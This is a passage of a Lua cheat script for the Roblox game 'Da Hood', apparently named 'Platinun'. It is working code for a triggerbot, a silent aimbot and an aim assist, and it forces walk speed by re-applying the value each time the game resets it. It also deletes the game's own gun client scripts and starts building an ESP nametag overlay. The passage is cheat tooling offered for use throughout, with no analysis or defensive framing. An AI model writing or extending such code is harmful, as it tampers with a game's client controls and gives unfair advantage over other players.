    function Script:Triggerbot()
        if UserInputService:IsKeyDown(Enum.KeyCode.LeftControl) or UserInputService:IsKeyDown(Enum.KeyCode.RightControl) then TriggerPart.Position = Vector3.zero; return end
        local TriggerbotConfig = getgenv()['Platinun']['Triggerbot']
        if not TriggerbotConfig['Enabled'] then TriggerPart.Position = Vector3.zero; return end
        local selfCharacter = Self.Character
        if not selfCharacter or not selfCharacter:FindFirstChild("HumanoidRootPart") then TriggerPart.Position = Vector3.zero; return end
        local tool = selfCharacter:FindFirstChildOfClass("Tool")
        if not tool or not tool:FindFirstChild("Ammo") or tool.Name == "[Knife]" then TriggerPart.Position = Vector3.zero; return end
        local target = Script.Locals.TriggerbotTarget
        if not target or not target.Character or not target.Character:FindFirstChild("HumanoidRootPart") then TriggerPart.Position = Vector3.zero; return end
        local Conditions = getgenv()['Platinun']['General']['Conditions']['Triggerbot']
        if Conditions['Visible'] then
            if not Script:RayCast(target.Character.HumanoidRootPart, Script:GetOrigin('Camera'), {Self.Character, SilentAimPart, TriggerPart}) then TriggerPart.Position = Vector3.zero; return end
        end
        if Conditions['Knocked'] and CurrentGame.Functions.IsKnocked(target.Character) then TriggerPart.Position = Vector3.zero; return end
        if Conditions['Self Knocked'] and CurrentGame.Functions.IsKnocked(Self.Character) then TriggerPart.Position = Vector3.zero; return end
        if Conditions['Carried'] and CurrentGame.Functions.IsGrabbed(target) then TriggerPart.Position = Vector3.zero; return end
        local targetDistance = (selfCharacter.HumanoidRootPart.Position - target.Character.HumanoidRootPart.Position).Magnitude
        if targetDistance > TriggerbotConfig['Max Distance'] then TriggerPart.Position = Vector3.zero; return end
        TriggerPart.Size = Vector3.new(TriggerbotConfig['FOV']['X'] or 3.3, TriggerbotConfig['FOV']['Y'] or 7, TriggerbotConfig['FOV']['Z'] or 3.6)
        TriggerPart.Parent = workspace; TriggerPart.Anchored = true; TriggerPart.CanCollide = false; TriggerPart.CanQuery = true
        TriggerPart.Transparency = TriggerbotConfig['FOV']['Visible'] and 0.7 or 1
        TriggerPart.Color = Color3.new(1, 0, 0)
        local prediction = TriggerbotConfig['Prediction']
        if prediction['Enabled'] then
            local velocity = GetResolvedVelocity(target.Character.HumanoidRootPart)
            TriggerPart.Position = target.Character.HumanoidRootPart.Position + Vector3.new(velocity.X * prediction['Value'], 0, velocity.Z * prediction['Value'])
        else TriggerPart.Position = target.Character.HumanoidRootPart.Position end
        if not Script.Locals.TriggerState then TriggerPart.Color = Color3.new(1, 0, 0); return end
        local mouseLocation = UserInputService:GetMouseLocation()
        local ray = Camera:ViewportPointToRay(mouseLocation.X, mouseLocation.Y)
        local result = raycastTrigger(ray.Origin, ray.Direction * 1000, triggerRaycastParams)
        if result and result.Instance == TriggerPart and tool.Name ~= '[Knife]' then
            local currentTime = tick()
            if currentTime - Script.Locals.LastTriggerShot >= TriggerbotConfig['Cooldown'] then
                Script.Locals.LastTriggerShot = currentTime
                tool:Activate()
                TriggerPart.Color = Color3.new(0, 1, 0)
            end
        else TriggerPart.Color = Color3.new(1, 0, 0) end
    end
    function Script:Physics()
        local char = Self.Character
        if not char then return end
        local Hum = char:FindFirstChildOfClass("Humanoid")
        if not Hum then return end

        if getgenv()['Platinun']['Player Modifications']['Anti Fall'] then
            if Hum.Health > 1 and Hum:GetState() == Enum.HumanoidStateType.FallingDown then
                pcall(function() Hum:ChangeState(Enum.HumanoidStateType.GettingUp) end)
            end
        end

        local wsCfg = getgenv()['Platinun']['Player Modifications']['Walk Speed']
        if wsCfg and wsCfg['Enabled'] and Script.Locals.IsWalkSpeeding ~= false then
            local spd = tonumber(wsCfg['Speed']) or 16
            pcall(function()
                Hum.WalkSpeed = spd
            end)
        end
    end
    local function AttachMovementEnforcer(char)
        if not char then return end
        local hum = char:FindFirstChildOfClass("Humanoid")
        if not hum then
            hum = char:WaitForChild("Humanoid", 5)
        end
        if not hum then return end
        if hum:GetAttribute("__PlatinunMovementHooked") then return end
        hum:SetAttribute("__PlatinunMovementHooked", true)

        local function applyWS()
            local wsCfg = getgenv()['Platinun']['Player Modifications']['Walk Speed']
            if not wsCfg or not wsCfg['Enabled'] then return end
            if Script.Locals.IsWalkSpeeding == false then return end
            local spd = tonumber(wsCfg['Speed']) or 16
            if hum.WalkSpeed ~= spd then
                pcall(function() hum.WalkSpeed = spd end)
            end
        end

        -- instant re-apply on any overwrite attempt
        hum:GetPropertyChangedSignal("WalkSpeed"):Connect(applyWS)

        -- apply right now, don't wait a frame
        applyWS()
    end

    -- fire immediately for the character that already exists
    if Self.Character then
        task.spawn(AttachMovementEnforcer, Self.Character)
    end
    -- and on every respawn
    Self.CharacterAdded:Connect(function(c)
        task.spawn(AttachMovementEnforcer, c)
    end)
end

do
    local FOVPlatinun = getgenv()['Platinun']['Silent Aimbot']['FOV']
    local SilentAimPlatinun = getgenv()['Platinun']['Silent Aimbot']

    -- ========== CORE FOV VISUALS (exact from SilentAim_Standalone) ==========
    local CoreFovGui = Instance.new("ScreenGui")
    CoreFovGui.Name = "Platinun_CoreFOV"
    CoreFovGui.IgnoreGuiInset = true
    CoreFovGui.ResetOnSpawn = false
    pcall(function() CoreFovGui.Parent = game:GetService("CoreGui") end)
    if not CoreFovGui.Parent then CoreFovGui.Parent = Self:WaitForChild("PlayerGui") end

    local CircleFrame = Instance.new("Frame")
    CircleFrame.BackgroundTransparency = 1
    CircleFrame.BorderSizePixel = 0
    CircleFrame.AnchorPoint = Vector2.new(0.5, 0.5)
    Instance.new("UICorner", CircleFrame).CornerRadius = UDim.new(1, 0)
    local CircleStroke = Instance.new("UIStroke", CircleFrame)
    CircleStroke.Thickness = 1
    CircleStroke.Color = Color3.fromRGB(255, 255, 255)
    CircleStroke.Transparency = 0
    CircleFrame.Visible = false
    CircleFrame.Parent = CoreFovGui

    local BoxFrame = Instance.new("Frame")
    BoxFrame.BackgroundTransparency = 1
    BoxFrame.BorderSizePixel = 0
    local BoxStroke = Instance.new("UIStroke", BoxFrame)
    BoxStroke.Thickness = 1
    BoxStroke.Color = Color3.fromRGB(255, 255, 255)
    BoxStroke.LineJoinMode = Enum.LineJoinMode.Miter
    BoxFrame.Visible = false
    BoxFrame.Parent = CoreFovGui

    -- keep SilentAimPart as FOVPart for 3D mode (already exists globally)
    -- dummy locals so old FieldOfViewOne/Two refs don't nil-error
    Script.Locals.FieldOfViewOne = {
        Visible = false, Color = Color3.new(1,1,1),
        Position = Vector2.zero, Size = Vector2.zero,
    }
    Script.Locals.FieldOfViewTwo = {
        Visible = false, Color = Color3.new(1,1,1),
        Radius = 0, Position = Vector2.zero,
    }

        local function CoreUpdateFOVDrawing()
        local FOV = getgenv()['Platinun']['Silent Aimbot']['FOV']
        if not FOV then
            CircleFrame.Visible = false
            BoxFrame.Visible = false
            return
        end

        CurrentFOV  = FOV['Circle'] or 120
        CurrentFOVX = (FOV['2D'] and FOV['2D']['X']) or 127
        CurrentFOVY = (FOV['2D'] and FOV['2D']['Y']) or 127

        local mouseLoc  = UserInputService:GetMouseLocation()
        local showBox   = FOV['Visible'] == true
        local mode      = FOV['Mode']

        CircleFrame.Visible = false
        BoxFrame.Visible    = false

        -- master switch only
        if not FOV['Enabled'] then
            if SilentAimPart then SilentAimPart.Position = Vector3.new(0, -9999, 0) end
            Script.Locals.IsBoxFocused = false
            if Script.Locals.FieldOfViewOne then Script.Locals.FieldOfViewOne.Visible = false end
            if Script.Locals.FieldOfViewTwo then Script.Locals.FieldOfViewTwo.Visible = false end
            return
        end

        if mode == 'Circle' then
            local r = FOV['Circle'] or 120

            -- draw only when visible
            if showBox then
                CircleFrame.Size     = UDim2.fromOffset(r * 2, r * 2)
                CircleFrame.Position = UDim2.fromOffset(mouseLoc.X, mouseLoc.Y)
                CircleFrame.Visible  = true
                Script.Locals.FieldOfViewTwo.Visible  = true
                Script.Locals.FieldOfViewTwo.Radius   = r
                Script.Locals.FieldOfViewTwo.Position = mouseLoc
            else
                Script.Locals.FieldOfViewTwo.Visible  = false
            end

            -- focus is a mouse-centred radius; nothing else to compute
            Script.Locals.IsBoxFocused = false

        elseif mode == '2D' then
            local box = FOV['2D'] or { X = 127, Y = 127 }
            local hx, hy = box['X'] or 127, box['Y'] or 127
            CurrentFOVX, CurrentFOVY = hx, hy

            local target = Script.Locals.SilentAimTarget
            if not (target and target.Character and target.Character:FindFirstChild('HumanoidRootPart')) then
                local maxD = (getgenv()['Platinun']['Silent Aimbot']['Max Distance']) or 1234
                target = Script:GetClosestPlayerToCursor(maxD, math.huge, 'Silent Aim')
            end

            -- reset gate each frame
            Script.Locals.IsBoxFocused = false
            if Script.Locals.FieldOfViewOne then
                Script.Locals.FieldOfViewOne.Visible = false
            end
            if showBox then
                BoxStroke.Color = Color3.fromRGB(255, 255, 255)
            end

            if target and target.Character then
                local hrp = target.Character:FindFirstChild('HumanoidRootPart')
                if hrp then
                    local screenPos, onScreen = Camera:WorldToViewportPoint(hrp.Position)
                    if onScreen and screenPos.Z > 0 then
                        local sizeY = hrp.Size.Y
                        local scaleFactor = (sizeY * Camera.ViewportSize.Y) / (screenPos.Z * 2) * 80 / Camera.FieldOfView
                        local w  = hx * scaleFactor
                        local h  = hy * scaleFactor
                        local px = screenPos.X - w / 2
                        local py = screenPos.Y - h / 2

                        -- FOCUS IS COMPUTED REGARDLESS OF VISIBILITY
                        local focused =
                            mouseLoc.X >= px and mouseLoc.X <= px + w and
                            mouseLoc.Y >= py and mouseLoc.Y <= py + h

                        if focused then
                            Script.Locals.IsBoxFocused = true
                        end

                        -- DRAW ONLY WHEN VISIBLE
                        if showBox then
                            BoxFrame.Size     = UDim2.fromOffset(w, h)
                            BoxFrame.Position = UDim2.fromOffset(px, py)
                            BoxFrame.Visible  = true

                            if Script.Locals.FieldOfViewOne then
                                Script.Locals.FieldOfViewOne.Visible  = true
                                Script.Locals.FieldOfViewOne.Position = Vector2.new(px, py)
                                Script.Locals.FieldOfViewOne.Size     = Vector2.new(w, h)
                                if focused then
                                    BoxStroke.Color = Color3.fromRGB(255, 0, 0)
                                end
                            end
                        end
                    end
                end
            end

        elseif mode == '3D' then
            local s3 = FOV['3D'] or { X = 12, Y = 12, Z = 12 }
            if SilentAimPart then
                SilentAimPart.Size         = Vector3.new(s3['X'] or 12, s3['Y'] or 12, s3['Z'] or 12)
                SilentAimPart.Transparency = showBox and 0.7 or 1
                SilentAimPart.Anchored     = true
                SilentAimPart.CanCollide   = false
                SilentAimPart.CanQuery     = true
                SilentAimPart.Parent       = workspace

                local target = Script.Locals.SilentAimTarget
                if target and target.Character then
                    local hrp = target.Character:FindFirstChild('HumanoidRootPart')
                    SilentAimPart.Position = hrp and hrp.Position or Vector3.new(0, -9999, 0)
                else
                    SilentAimPart.Position = Vector3.new(0, -9999, 0)
                end
            end
        end
    end

    -- keep UpdateBox as thin wrapper so old calls still work
    function Script:UpdateBox()
        CoreUpdateFOVDrawing()
    end

    local Activated
    local function OnLocalSpawn(spawnedChar)
        if (not spawnedChar) then return end
        spawnedChar.ChildAdded:Connect(function(Tool)
            if (not Tool:IsA("Tool")) then return end
            Activated = Tool.Activated:Connect(function() Script:SilentAimFunc(Tool) end)
        end)
        spawnedChar.ChildRemoved:Connect(function(Tool)
            if (not Tool:IsA("Tool")) then return end
            if Activated then Activated:Disconnect() end
        end)
    end
    OnLocalSpawn(Self.Character)
    Self.CharacterAdded:Connect(OnLocalSpawn)

    local function UpdateDrawings()
        CoreUpdateFOVDrawing()
    end
    -- was 0.02s (50x/sec) scanning tool children — major hitch source
    local _gunClientNames = {
        Pistol = "GunClient", Sniper = "GunClient",
        Shotgun = "GunClientShotgun", Auto = "GunClientAutomaticShotgun",
        Burst = "GunClientBurst", Rifle = "GunClientAutomatic", SMG = "GunClientAutomatic",
    }
    ThreadLoop(0.25, function()
        if not string.find(GameName, "Da Hood") then return end
        local char = Self.Character
        if not char then return end
        local Tool = char:FindFirstChildWhichIsA("Tool")
        if not Tool then return end
        local GunType = Script:GetGunCategory()
        local targetName = _gunClientNames[GunType]
        if not targetName then return end
        local child = Tool:FindFirstChild(targetName)
        if child then child:Destroy() end
    end)
    RBXConnection(UserInputService.InputBegan, function(Input, Processed)
        if Processed then return end
        if Input.UserInputType ~= Enum.UserInputType.Keyboard then return end

        local K = getgenv()['Platinun'] and getgenv()['Platinun']['General'] and getgenv()['Platinun']['General']['Keybind List']
        if type(K) ~= 'table' then return end
        local Mode = (getgenv()['Platinun']['Silent Aimbot']['FOV']['Selection Method']) or 'Toggle'

        local function toKeyCode(name)
            if type(name) ~= 'string' or name == '' then return nil end
            local ok, kc = pcall(function() return Enum.KeyCode[name:upper()] end)
            return (ok and kc) or nil
        end

        -- nested preferred; flat fallback
        local function bindFrom(entry, nestedKey, flatKey)
            if type(entry) == 'table' then
                local v = entry[nestedKey]
                if v == nil then
                    -- accept either Keybind or Bind naming
                    v = entry['Keybind'] or entry['Bind'] or entry['Target Bind']
                end
                return toKeyCode(v)
            elseif type(entry) == 'string' then
                return toKeyCode(entry)
            end
            if flatKey and type(K[flatKey]) == 'string' then
                return toKeyCode(K[flatKey])
            end
            return nil
        end

        local AssistBind      = bindFrom(K['Camera Aimbot'], 'Keybind', 'Camera Aimbot')
            or bindFrom(K['Camera Aimbot'], 'Bind', 'Camera Aimbot')
        local SilentBind      = bindFrom(K['Silent Aimbot'], 'Target Bind', 'Silent Aim Target')
            or bindFrom(K['Silent Aimbot'], 'Keybind', 'Silent Aim Target')
        local TriggerFireBind = bindFrom(K['Triggerbot'], 'Keybind', 'Triggerbot')
            or bindFrom(K['Triggerbot'], 'Bind', 'Triggerbot')
        local ESPKey          = toKeyCode(K['ESP'])
        local WSKey           = toKeyCode(K['Walk Speed'])

        -- Walk Speed toggle
        if WSKey and Input.KeyCode == WSKey then
            Script.Locals.IsWalkSpeeding = not Script.Locals.IsWalkSpeeding
            if not Script.Locals.IsWalkSpeeding then
                local hum = Self.Character and Self.Character:FindFirstChildOfClass("Humanoid")
                if hum then pcall(function() hum.WalkSpeed = 16 end) end
            end
        end

        -- ESP toggle
        if ESPKey and Input.KeyCode == ESPKey then
            local esp = getgenv()['Platinun']['ESP']
            if esp then esp['Enabled'] = not esp['Enabled'] end
        end

--===== TARGET KEYBINDS (stateless, config-driven) =====
do

    if Mode == 'Toggle' then
        -- TOGGLE MODE: target binds arm/disarm targeting
        if SilentBind and Input.KeyCode == SilentBind then
            Script.Locals.SP = not Script.Locals.SP
            if not Script.Locals.SP then
                Script.Locals.SilentAimTarget = nil
                Script.Locals.HitPosition = Vector3.new()
            else
                local maxD = (getgenv()['Platinun']['Silent Aimbot'] and getgenv()['Platinun']['Silent Aimbot']['Max Distance']) or 1234
                local fovCfg = (getgenv()['Platinun']['Silent Aimbot'] and getgenv()['Platinun']['Silent Aimbot']['FOV']) or {}
                local screenFov = math.huge
                if fovCfg['Enabled'] and fovCfg['Mode'] == 'Circle' then
                    screenFov = fovCfg['Circle'] or 120
                end
                Script.Locals.SilentAimTarget = Script:GetClosestPlayerToCursor(maxD, screenFov, 'Silent Aim')
            end
        end

        if AssistBind and Input.KeyCode == AssistBind then
            Script.Locals.SP2 = not Script.Locals.SP2
            if not Script.Locals.SP2 then
                Script.Locals.AimAssistTarget = nil
            else
                -- lock closest on arm
                local maxD = (getgenv()['Platinun']['Silent Aimbot'] and getgenv()['Platinun']['Silent Aimbot']['Max Distance']) or 1234
                Script.Locals.AimAssistTarget = Script:GetClosestPlayerToCursor(maxD * 2, math.huge, 'Aim Assist')
            end
        end

        if SilentBind and Input.KeyCode == SilentBind then
            -- already toggled SP above; ensure target on arm
            if Script.Locals.SP then
                local maxD = (getgenv()['Platinun']['Silent Aimbot'] and getgenv()['Platinun']['Silent Aimbot']['Max Distance']) or 1234
                local fovCfg = getgenv()['Platinun']['Silent Aimbot']['FOV'] or {}
                local screenFov = math.huge
                if fovCfg['Enabled'] and fovCfg['Mode'] == 'Circle' then
                    screenFov = fovCfg['Circle'] or 120
                end
                Script.Locals.SilentAimTarget = Script:GetClosestPlayerToCursor(maxD, screenFov, 'Silent Aim')
            end
        end
    else
        -- AUTO MODE: target binds only force retarget (clear current target)
        if SilentBind and Input.KeyCode == SilentBind then
            Script.Locals.SilentAimTarget = nil
            Script.Locals.HitPosition = Vector3.new()
        end

        if AssistBind and Input.KeyCode == AssistBind then
            -- Aim Assist still toggles even in Auto
            Script.Locals.SP2 = not Script.Locals.SP2
            if not Script.Locals.SP2 then
                Script.Locals.AimAssistTarget = nil
            else
                local maxD = (getgenv()['Platinun']['Silent Aimbot'] and getgenv()['Platinun']['Silent Aimbot']['Max Distance']) or 1234
                Script.Locals.AimAssistTarget = Script:GetClosestPlayerToCursor(maxD * 2, math.huge, 'Aim Assist')
            end
        end
    end

    -- Triggerbot ACTIVATE/DEACTIVATE uses Bind only (not Target Bind)
    if TriggerFireBind and Input.KeyCode == TriggerFireBind then
        local triggerConfig = getgenv()['Platinun']['Triggerbot']
        if triggerConfig and triggerConfig['Activation'] then
            if triggerConfig['Activation']['Type'] == "Toggle" then
                Script.Locals.TriggerState = not Script.Locals.TriggerState
                if not Script.Locals.TriggerState then
                    Script.Locals.TriggerbotTarget = nil
                end
            elseif triggerConfig['Activation']['Type'] == "Hold" then
                Script.Locals.TriggerState = true
            end
        end
    end
end
--===== END TARGET KEYBINDS =====
    end)
    RBXConnection(UserInputService.InputEnded, function(Input, Processed)
        local triggerConfig = getgenv()['Platinun']['Triggerbot']
        if triggerConfig['Activation']['Type'] == "Hold" then
            local raw = getgenv()['Platinun']['General']['Keybind List']['Triggerbot']
            local bindName = type(raw) == 'table' and (raw['Keybind'] or raw['Bind']) or raw
            if type(bindName) ~= 'string' or bindName == '' then return end
            local ok, TriggerbotKey = pcall(function() return Enum.KeyCode[bindName:upper()] end)
            if not ok or not TriggerbotKey then return end
            local isMouseInput = triggerConfig['Activation']['Mode'] == 'Mouse'
            local isKeyboardInput = triggerConfig['Activation']['Mode'] == 'Keybind'
            if isMouseInput and Input.UserInputType == Enum.UserInputType[bindName] then Script.Locals.TriggerState = false
            elseif isKeyboardInput and Input.KeyCode == TriggerbotKey then Script.Locals.TriggerState = false end
        end
    end)
    local _platinunLastTick = 0
    local _platinunLastFovTick = 0
    local _platinunLastRetarget = 0
    local _platinunLastPhysics = 0
    RBXConnection(RunService.Heartbeat, LPH_NO_VIRTUALIZE(function()
    local now = os.clock()
    -- aim assist stays responsive; everything else is throttled
    if Script.Locals.SP2 then
        pcall(function() Script:AimAssist() end)
    end
    if now - _platinunLastPhysics >= 0.05 then
        _platinunLastPhysics = now
        pcall(function() Script:Physics() end)
    end
    -- heavy work ~30hz max
    if now - _platinunLastTick < 0.033 then
        return
    end
    _platinunLastTick = now
    local targetingMode = getgenv()['Platinun']['Silent Aimbot']['FOV']['Selection Method']
        --===== AUTO-UNTARGET + UNTOGGLE ON KNOCK / DEATH =====
    if getgenv()['Platinun']['General']['Keybind List']['Automated Untarget'] then
        local function isDeadOrKnocked(p)
            if not p then return false end
            local char = (typeof(p) == "Instance" and p:IsA("Player")) and p.Character or p
            if not char or not char.Parent then return true end
            local hum = char:FindFirstChildOfClass("Humanoid")
            if not hum or hum.Health <= 0 then return true end
            return CurrentGame.Functions.IsKnocked(char)
        end

        -- if WE are knocked/dead, disengage every feature + clear all targets
        local selfChar = Self.Character
        local selfHum  = selfChar and selfChar:FindFirstChildOfClass("Humanoid")
        if not selfChar or not selfHum or selfHum.Health <= 0
           or CurrentGame.Functions.IsKnocked(selfChar) then
            Script.Locals.SP, Script.Locals.SP2 = false, false
            Script.Locals.TriggerState = false
            Script.Locals.SilentAimTarget  = nil
            Script.Locals.AimAssistTarget  = nil
            Script.Locals.TriggerbotTarget = nil
            Script.Locals.HitPosition      = Vector3.new()
            if SilentAimPart then SilentAimPart.Position = Vector3.zero end
            if TriggerPart   then TriggerPart.Position   = Vector3.zero end
        else
            -- per-feature: if that feature's target is knocked/dead, drop it AND untoggle it
            if Script.Locals.SP and isDeadOrKnocked(Script.Locals.SilentAimTarget) then
                Script.Locals.SP = false
                Script.Locals.SilentAimTarget = nil
                Script.Locals.HitPosition = Vector3.new()
                if SilentAimPart then SilentAimPart.Position = Vector3.zero end
            end

            if Script.Locals.SP2 and isDeadOrKnocked(Script.Locals.AimAssistTarget) then
                Script.Locals.SP2 = false
                Script.Locals.AimAssistTarget = nil
            end

            if Script.Locals.TriggerState and isDeadOrKnocked(Script.Locals.TriggerbotTarget) then
                Script.Locals.TriggerState = false
                Script.Locals.TriggerbotTarget = nil
                if TriggerPart then TriggerPart.Position = Vector3.zero end
            end
        end
    end
    --===== END AUTO-UNTARGET + UNTOGGLE =====

        --===== AUTO MODE (core SilentAim style) =====
    -- Auto: always active when Enabled + alive; continuously re-picks closest in FOV.
    -- Toggle: only active when SP/SP2/SP3 toggled; re-picks only if target invalid.
    local function targetStillValid(p)
        if not p or not p.Parent then return false end
        local c = p.Character
        if not c or not c.Parent then return false end
        local hrp = c:FindFirstChild('HumanoidRootPart')
        local hum = c:FindFirstChildOfClass('Humanoid')
        if not hrp or not hum or hum.Health <= 0 then return false end
        if CurrentGame and CurrentGame.Functions and CurrentGame.Functions.IsKnocked then
            local ok, kn = pcall(CurrentGame.Functions.IsKnocked, c)
            if ok and kn then return false end
        end
        return true
    end

    local isAuto = (targetingMode == 'Auto')

    if isAuto then
        local sc = Self.Character
        local sh = sc and sc:FindFirstChildOfClass('Humanoid')
        local alive = sc and sh and sh.Health > 0
        if alive and CurrentGame and CurrentGame.Functions and CurrentGame.Functions.IsKnocked then
            local okK, kn = pcall(CurrentGame.Functions.IsKnocked, sc)
            if okK and kn then alive = false end
        end
        if alive then
            if getgenv()['Platinun']['Silent Aimbot']['Enabled'] == true then
                Script.Locals.SP = true
            else
                Script.Locals.SP = false
                Script.Locals.SilentAimTarget = nil
            end
            -- Aim Assist still needs its keybind toggle (SP2); Auto only arms silent/trigger targeting
        else
            Script.Locals.SP  = false
            Script.Locals.SilentAimTarget  = nil
            Script.Locals.HitPosition      = Vector3.new()
        end
    end

    -- Core-style target acquisition:
    -- Auto  -> every frame: Target = GetClosestPlayer() (FOV + distance + checks)
    -- Toggle -> only re-acquire when toggled ON and current target is missing/invalid
    pcall(function()
        local saCfg = getgenv()['Platinun']['Silent Aimbot'] or {}
        local maxD  = saCfg['Max Distance'] or 500
        local fovCfg = saCfg['FOV'] or {}
        local screenFov = math.huge
        if fovCfg['Enabled'] then
            if fovCfg['Mode'] == 'Circle' then
                screenFov = fovCfg['Circle'] or CurrentFOV or 120
            elseif fovCfg['Mode'] == '2D' then
                -- rect handled inside GetClosestPlayerToCursor for Silent Aim
                screenFov = math.huge
            end
        end

        if Script.Locals.SP then
            if isAuto then
                -- retarget at most ~10/sec (GetClosest over all players is expensive)
                if now - _platinunLastRetarget >= 0.1 or not Script.Locals.SilentAimTarget then
                    _platinunLastRetarget = now
                    Script.Locals.SilentAimTarget = Script:GetClosestPlayerToCursor(maxD, screenFov, 'Silent Aim')
                    if not Script.Locals.SilentAimTarget then
                        Script.Locals.HitPosition = Vector3.new()
                    end
                end
            else
                -- Toggle: sticky until invalid
                if not targetStillValid(Script.Locals.SilentAimTarget) then
                    Script.Locals.SilentAimTarget = Script:GetClosestPlayerToCursor(maxD, screenFov, 'Silent Aim')
                    if not Script.Locals.SilentAimTarget then
                        Script.Locals.HitPosition = Vector3.new()
                    end
                end
            end
        else
            if not isAuto then
                -- keep cleared when toggled off
            end
        end

        if Script.Locals.TriggerState then
            local tbCfg = getgenv()['Platinun']['Triggerbot'] or {}
            local tbMax = tbCfg['Max Distance'] or 230
            local tbFov = math.huge
            if tbCfg['FOV'] then
                tbFov = (tbCfg['FOV']['X'] or 33) * 8
            end
            if not targetStillValid(Script.Locals.TriggerbotTarget) then
                Script.Locals.TriggerbotTarget = Script:GetClosestPlayerToCursor(tbMax, tbFov, 'Triggerbot')
            end
        else
            Script.Locals.TriggerbotTarget = nil
        end

        -- Aim Assist: sticky on both modes (only re-pick when invalid). Keybind still required.
        if Script.Locals.SP2 then
            if not targetStillValid(Script.Locals.AimAssistTarget) then
                local assistMax = maxD * 2
                Script.Locals.AimAssistTarget = Script:GetClosestPlayerToCursor(assistMax, math.huge, 'Aim Assist')
            end
        end
    end)
    --===== END AUTO MODE (core) =====

    -- FOV visual (always, throttled a bit less tight)
    if now - _platinunLastFovTick >= 0.08 then
        _platinunLastFovTick = now
        pcall(UpdateDrawings)
        pcall(function() Script:UpdateStatusUI() end)
    end

    local fovCfg = getgenv()['Platinun']['Silent Aimbot']['FOV']
    local silentOk = Script.Locals.SP and Script.Locals.SilentAimTarget and Script.Locals.SilentAimTarget.Character

    if silentOk then
        -- for 2D mode, only compute hit + allow shoot when mouse is in player box
        if fovCfg and fovCfg['Enabled'] and fovCfg['Mode'] == '2D' then
            if Script.Locals.IsBoxFocused then
                pcall(function()
                    Script.Locals.HitPosition = Script:GetHitPosition('Silent')
                end)
            else
                Script.Locals.HitPosition = Vector3.new()
            end
        else
            pcall(function()
                Script.Locals.HitPosition = Script:GetHitPosition('Silent')
            end)
        end
        pcall(function() Script:ShouldShoot(Script.Locals.SilentAimTarget) end)
    else
        Script.Locals.HitPosition = Vector3.new()
    end

    pcall(function() Script:AimAssist() end)
    pcall(function() Script:Triggerbot() end)
    pcall(function() Script:Physics() end)
    end))
end

-- ==================== PIXEL NAMETAG ESP ====================
do
    local Players = game:GetService("Players")
    local RunService = game:GetService("RunService")
    local Workspace = game:GetService("Workspace")
    local CoreGui = game:GetService("CoreGui")

    local localPlayer = Players.LocalPlayer
    local ARMOR_MAX = 200

    local SCALE_NEAR = 1.15
    local SCALE_FAR  = 0.72
    local NEAR_DIST  = 12
    local FAR_DIST   = 70

    local function guiParent()
        local ok, hui = pcall(gethui)
        if ok and hui then return hui end
        return CoreGui
    end

    pcall(function()
        local parent = guiParent()
        local old = parent:FindFirstChild("PixelNametagESP")
        if old then old:Destroy() end
    end)

    local screen = Instance.new("ScreenGui")
    screen.Name = "PixelNametagESP"
    screen.IgnoreGuiInset = true
    screen.ResetOnSpawn = false
    screen.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    screen.DisplayOrder = 999999999
    screen.Parent = guiParent()

    local tags = {}
    local connections = {}

    local function px(n)
        return math.floor(n + 0.5)
    end

    local function mcFont(label, size)
        label.Font = Enum.Font.Arcade
        label.TextSize = size
        label.TextWrapped = false
        label.BackgroundTransparency = 1
        label.TextYAlignment = Enum.TextYAlignment.Center
        label.TextStrokeTransparency = 0
        label.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
    end

    local function makeBar()
        local row = Instance.new("Frame")
        row.Name = "Row"
        row.BackgroundTransparency = 1
        row.Size = UDim2.fromOffset(64, 5)
        row.AnchorPoint = Vector2.new(0.5, 0)

        local border = Instance.new("Frame")
        border.Name = "Border"
        border.BackgroundColor3 = Color3.fromRGB(16, 16, 16)
        border.BorderSizePixel = 0
        border.Size = UDim2.fromOffset(48, 5)
        border.Position = UDim2.fromOffset(0, 0)
        border.Parent = row

        local empty = Instance.new("Frame")
        empty.Name = "Empty"
        empty.BackgroundColor3 = Color3.fromRGB(40, 10, 10)
        empty.BorderSizePixel = 0
        empty.Position = UDim2.fromOffset(1, 1)
        empty.Size = UDim2.fromOffset(46, 3)
        empty.Parent = border

        local fill = Instance.new("Frame")
        fill.Name = "Fill"
        fill.BackgroundColor3 = Color3.fromRGB(88, 220, 88)
        fill.BorderSizePixel = 0
        fill.Size = UDim2.fromOffset(46, 3)
        fill.Parent = empty

        local shine = Instance.new("Frame")
        shine.Name = "Shine"
        shine.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        shine.BackgroundTransparency = 0.7
        shine.BorderSizePixel = 0
        shine.Size = UDim2.new(1, 0, 0, 1)
        shine.Parent = fill

        local num = Instance.new("TextLabel")
        num.Name = "Num"
        num.Position = UDim2.fromOffset(50, -2)
        num.Size = UDim2.fromOffset(20, 9)
        num.TextXAlignment = Enum.TextXAlignment.Left
        num.TextColor3 = Color3.fromRGB(255, 255, 255)
        mcFont(num, 8)
        num.ZIndex = 2

        local shadow = num:Clone()
        shadow.Name = "NumShadow"
        shadow.TextColor3 = Color3.fromRGB(35, 35, 35)
        shadow.Position = UDim2.fromOffset(51, -1)
        shadow.ZIndex = 1
        shadow.Parent = row
        num.Parent = row

        return {
            row = row,
            fill = fill,
            num = num,
            numShadow = shadow,
        }
    end

    local function setBar(bar, value, maxValue, color, emptyColor)
        local maxv = math.max(maxValue, 1)
        local ratio = math.clamp(value / maxv, 0, 1)
        bar.fill.Size = UDim2.fromOffset(px(46 * ratio), 3)
        bar.fill.BackgroundColor3 = color
        if emptyColor then
            bar.fill.Parent.BackgroundColor3 = emptyColor
        end
        local text = tostring(math.floor(value + 0.5))
        bar.num.Text = text
        bar.numShadow.Text = text
    end

    local function hpColor(ratio)
        if ratio > 0.5 then
            return Color3.fromRGB(88, 220, 88):Lerp(Color3.fromRGB(230, 220, 70), (1 - ratio) * 2)
        end
        return Color3.fromRGB(230, 220, 70):Lerp(Color3.fromRGB(220, 55, 55), (0.5 - ratio) * 2)
    end

    local function makeTag(player)
        local nameHolder = Instance.new("Frame")
        nameHolder.Name = player.Name .. "_Name"
        nameHolder.BackgroundTransparency = 1
        nameHolder.AnchorPoint = Vector2.new(0.5, 1)
        nameHolder.Size = UDim2.fromOffset(120, 16)
        nameHolder.Visible = false
        nameHolder.Parent = screen

        local nameScale = Instance.new("UIScale")
        nameScale.Scale = 1
        nameScale.Parent = nameHolder

        -- drop the hard shadow; use TextStroke instead for a thicker outline
        local nameShadow = Instance.new("TextLabel")
        nameShadow.Name = "Shadow"
        nameShadow.Size = UDim2.new(1, 0, 1, 0)
